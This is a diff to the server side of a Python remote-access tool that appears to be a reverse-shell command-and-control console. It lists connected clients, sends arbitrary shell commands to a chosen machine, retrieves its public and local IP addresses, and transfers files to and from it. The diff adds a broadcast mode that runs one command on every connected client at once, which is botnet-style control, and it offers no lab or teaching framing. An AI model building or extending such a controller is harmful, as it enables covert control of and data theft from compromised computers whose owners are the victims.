@@ -228,26 +228,9 @@ def upload(cl_socket, cmd):
         print(f"{red}[!] File upload error: {e}{reset}")
         send(cl_socket, b"up:aborted+*~")
     
-    
-
-    # if os.path.isdir(file_path):
-    #     cl_socket.send(b"DIR_UPLOAD")
-    #     files = [f for f in os.listdir(file_path) if os.path.isfile(os.path.join(file_path, f))]
-    #     cl_socket.send(struct.pack(">I", len(files)))
-        
-    #     for file in files:
-    #         filepath = os.path.join(file_path, file)
-    #         cl_socket.send(file.encode())  # Send filename
-    #         with open(filepath, "rb") as f:
-    #             cl_socket.send(f.read())   # Send raw file data
-    #         cl_socket.send(b"FILE_END")
-    # else:
-    #     cl_socket.send(b"FILE_UPLOAD")
-    #     with open(file_path, "rb") as f:
-    #         cl_socket.send(f.read())
-    #     cl_socket.send(b"FILE_END")
 
 def send_file():
+    """For future update for directory upload"""
     pass
 
 def save_file():    
@@ -271,58 +254,72 @@ def open_file():
     file_name = os.path.basename(file_path)
     return file_path, file_name
 
-
-def command_handler(cl_addr, cl_socket):
-    """ User-interactive command handler for a specific client """
-    ip, port = cl_addr
-    print(f"{yellow}[*]{reset} Interracting with {ip}:{port}")
-
+def broadcas_all(clients):
+    print(f"{yellow}[*]{reset}Broadcasting... ")
     while True:
         try:
-            cmd = input(f"\n{cyan}[$]{reset} {blue}{ip}:{port}>{reset} ").strip()
-            if not cmd:
-                continue
-                
-            if cmd.lower() == "kill":
-                send(cl_socket, cmd.encode())
-                cl_socket.close()
-                clients.pop(cl_addr, None)
-                return
-
-            elif cmd.lower() == "getip":
-                send(cl_socket, cmd.encode())
-                response = recv(cl_socket)
-                if response:
-                    try:
-                        ip_info = json.loads(response.decode())
-                        print(f"{purple}[>] Client Public IP:{reset} {ip_info['pip']}")
-                        print(f"{purple}[>] Client Local IP:{reset} {ip_info['lip']}")
-                    except json.JSONDecodeError:
-                        print(f"{red}[!] Invalid response from client:{reset} {response.decode()}")
-                else:
-                    print(f"{red}[!] No response from client{reset}")
-
-            elif cmd.lower().startswith("download"):
-                download(cl_socket, cmd)
-            elif cmd.lower().startswith("upload"):
-                upload(cl_socket, cmd)
+            cmd = input(f"\n{cyan}[$]{reset} {blue}Broadcast all>{reset} ").strip()
+            if cmd.lower() not in  ("download", "back"):
+                for cl_addr, cl_socket in clients.items():
+                    command_handler(cl_addr, cl_socket, cmd)
             elif cmd.lower() == "back":
                 return
-            else:
-                send(cl_socket, cmd.encode())
-                response = recv(cl_socket)
-                if response:
-                    print(response.decode())
-                else:
-                    print(f"{red}[!] No response from client{reset}")
-
-        except (ConnectionResetError, OSError) as e:
-            print(f"\n{red}[-]{reset} Connection lost: {e}")
-            clients.pop(cl_addr, None)
-            return
         except Exception as e:
             print(f"\n{red}[-]{reset} Error: {e}")
             continue
+
+def interact_user(cl_addr, cl_socket):
+    """ User-interactive command handler for a specific client """
+    try:
+        ip, port = cl_addr
+        print(f"{yellow}[*]{reset} Interracting with {ip}:{port}")
+        while True:
+            cmd = input(f"\n{cyan}[$]{reset} {blue}{ip}:{port}>{reset} ").strip()
+            if not cmd:
+                continue
+            elif cmd.lower() in ("back", "kill"):
+                return
+            else:
+                command_handler(cl_addr, cl_socket, cmd)
+            continue
+    except (ConnectionResetError, ConnectionError, OSError) as e:
+        print(f"\n{red}[-]{reset} Connection lost: {e}")
+        clients.pop(cl_addr, None)
+        return
+
+def command_handler(cl_addr, cl_socket, cmd):
+    try:                
+        if cmd.lower() == "kill":
+            send(cl_socket, cmd.encode())
+            cl_socket.close()
+            clients.pop(cl_addr, None)
+
+        elif cmd.lower() == "getip":
+            send(cl_socket, cmd.encode())
+            response = recv(cl_socket)
+            if response:
+                try:
+                    ip_info = json.loads(response.decode())
+                    print(f"{purple}[>] Client Public IP:{reset} {ip_info['pip']}")
+                    print(f"{purple}[>] Client Local IP:{reset} {ip_info['lip']}")
+                except json.JSONDecodeError:
+                    print(f"{red}[!] Invalid response from client:{reset} {response.decode()}")
+            else:
+                print(f"{red}[!] No response from client{reset}")
+        elif cmd.lower().startswith("download"):
+            download(cl_socket, cmd)
+        elif cmd.lower().startswith("upload"):
+            upload(cl_socket, cmd)
+        else:
+            send(cl_socket, cmd.encode())
+            response = recv(cl_socket)
+            if response:
+                print(response.decode())
+            else:
+                print(f"{red}[!] No response from client{reset}")
+    except Exception as e:
+        print(f"\n{red}[-]{reset} Error: {e}")
+        
 
 def start_server(lhost, lport):
     global server_active
@@ -347,12 +344,12 @@ def start_server(lhost, lport):
                     list_clients(clients)  
 
                 elif cmd == "0":
-                    print(f"{yellow}[*]{reset} Broadcast mode (to implement)")    
+                    broadcas_all(clients)  
                     
                 elif cmd.isdigit():
                     addr, client_socket = get_client_by_index(clients, int(cmd))
                     if client_socket:
-                        command_handler(addr, client_socket)
+                        interact_user(addr, client_socket)
                   
                 elif cmd == "exit":
                     print(f"{yellow}[*]{reset} Shutting down the server...")
